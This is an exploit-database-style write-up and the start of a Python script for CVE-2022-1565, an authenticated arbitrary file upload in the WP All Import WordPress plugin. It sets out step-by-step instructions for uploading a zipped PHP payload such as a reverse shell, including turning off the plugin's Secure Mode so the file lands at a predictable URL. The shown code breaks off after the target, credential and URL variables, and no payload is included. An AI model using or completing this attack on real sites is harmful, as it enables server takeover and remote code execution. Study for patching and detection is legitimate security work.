# Exploit Title: WP All Import v3.6.7 - Remote Code Execution (RCE) (Authenticated)
# Date: 11/05/2022
# Exploit Author: AkuCyberSec (https://github.com/AkuCyberSec)
# Vendor Homepage: https://www.wpallimport.com/
# Software Link: https://wordpress.org/plugins/wp-all-import/advanced/ (scroll down to select the version)
# Version: <= 3.6.7 (tested: 3.6.7)
# Tested on: WordPress 6.1 (os-independent since this exploit does NOT provide the payload)
# CVE: CVE-2022-1565

#!/usr/bin/python
import requests
import re
import os

# WARNING: This exploit does NOT include the payload.
# Also, be sure you already have some valid admin credentials. This exploit needs an administrator account in order to work.
# If a file with the same name as the payload is already on the server, the upload will OVERWRITE it
#
# Please notice that I'm NOT the researcher who found this vulnerability

# # # # # VULNERABILITY DESCRIPTION # # # # #
# The plugin WP All Import is vulnerable to arbitrary file uploads due to missing file type validation via the wp_all_import_get_gz.php file in versions up to, and including, 3.6.7.
# This makes it possible for authenticated attackers, with administrator level permissions and above, to upload arbitrary files on the affected sites server which may make remote code execution possible.

# # # # # HOW THE EXPLOIT WORKS # # # # #
# 1. Prepare the zip file:
#   - create a PHP file with your payload (e.g. rerverse shell)
#   - set the variable "payload_file_name" with the name of this file (e.g. "shell.php")
#   - create a zip file with the payload
#   - set the variable "zip_file_to_upload" with the PATH of this file (e.g. "/root/shell.zip")
#
# 2. Login using an administrator account:
#   - set the variable "target_url" with the base URL of the target (do NOT end the string with the slash /)
#   - set the variable "admin_user" with the username of an administrator account
#   - set the variable "admin_pass" with the password of an administrator account
#
# 3. Get the wpnonce using the get_wpnonce_upload_file() method
#   - there are actually 2 types of wpnonce:
#       - the first wpnonce will be retrieved using the method retrieve_wpnonce_edit_settings() inside the PluginSetting class.
#           This wpnonce allows us to change the plugin settings (check the step 4)
#       - the second wpnonce will be retrieved using the method retrieve_wpnonce_upload_file() inside the PluginSetting class.
#           This wpnonce allows us to upload the file
#
# 4. Check if the plugin secure mode is enabled using the method check_if_secure_mode_is_enabled() inside the PluginSetting class
#   - if the Secure Mode is enabled, the zip content will be put in a folder with a random name.
#       The exploit will disable the Secure Mode.
#       By disabling the Secure Mode, the zip content will be put in the main folder (check the variable payload_url).
#       The method called to enable and disable the Secure Mode is set_plugin_secure_mode(set_to_enabled:bool, wpnonce:str)
#   - if the Secure Mode is NOT enabled, the exploit will upload the file but then it will NOT enable the Secure Mode.
#
# 5. Upload the file using the upload_file(wpnonce_upload_file: str) method
#   - after the upload, the server should reply with HTTP 200 OK but it doesn't mean the upload was completed successfully.
#       The response will contain a JSON that looks like this:
#           {"jsonrpc":"2.0","error":{"code":102,"message":"Please verify that the file you uploading is a valid ZIP file."},"is_valid":false,"id":"id"}
#       As you can see, it says that there's an error with code 102 but, according to the tests I've done, the upload is completed
#
# 6. Re-enable the Secure Mode if it was enabled using the switch_back_to_secure_mode() method
#
# 7. Activate the payload using the activate_payload() method
#   - you can define a method to activate the payload.
#       There reason behind this choice is that this exploit does NOT provide any payload.
#       Since you can use a custom payload, you may want to activate it using an HTTP POST request instead of a HTTP GET request, or you may want to pass parameters

# # # # # WHY DOES THE EXPLOIT DISABLE THE SECURE MODE? # # # # #
# According to the PoC of this vulnerability provided by WPSCAN, we should be able to retrieve the uploaded files by visiting the "MAnaged Imports page"
# I don't know why but, after the upload of any file, I couldn't see the uploaded file in that page (maybe the Pro version is required?)
# I had to find a workaround and so I did, by exploiting this option.

# # # # # ANY PROBLEM WITH THE EXPLOIT? # # # # #
# In order for the exploit to work please consider the following:
# 1. check the target_url and the admin credentials
# 2. check the path of the zip file and the name of the payload (they can be different)
# 3. if you're testing locally, try to set verify_ssl_certificate on False
# 4. you can use print_response(http_response) to investigate further

# Configure the following variables:
target_url = "https://vulnerable.wp/wordpress"  # Target base URL
admin_user = "admin"                            # Administrator username
admin_pass = "password"                         # Administrator password
zip_file_to_upload = "/shell.zip"               # Path to the ZIP file (e.g /root/shell.zip)
payload_file_name = "shell.php"                 # Filename inside the zip file (e.g. shell.php). This file will be your payload (e.g. reverse shell)
verify_ssl_certificate = True                   # If True, the script will exit if the SSL Certificate is NOT valid. You can set it on False while testing locally, if needed.

# Do NOT change the following variables
wp_login_url = target_url + "/wp-login.php"                                                 # WordPress login page
wp_all_import_page_settings = target_url + "/wp-admin/admin.php?page=pmxi-admin-settings"   # Plugin page settings
payload_url = target_url + "/wp-content/uploads/wpallimport/uploads/" + payload_file_name   # Payload will be uploaded here
re_enable_secure_mode = False
session = requests.Session()
